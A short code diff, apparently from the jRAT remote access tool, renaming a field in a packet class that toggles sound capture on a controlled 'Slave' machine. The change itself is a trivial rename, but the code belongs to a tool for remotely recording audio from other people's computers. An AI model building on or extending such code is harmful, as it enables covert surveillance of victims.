@@ -7,15 +7,15 @@ import pro.jrat.Slave;
 
 public class Packet84SoundCapture extends AbstractOutgoingPacket {
 	
-	private boolean initialize;
+	private boolean enable;
 
-	public Packet84SoundCapture(boolean initialize) {
-		this.initialize = initialize;
+	public Packet84SoundCapture(boolean enable) {
+		this.enable = enable;
 	}
 	
 	@Override
 	public void write(Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeBoolean(initialize);
+		dos.writeBoolean(enable);
 	}
 
 	@Override
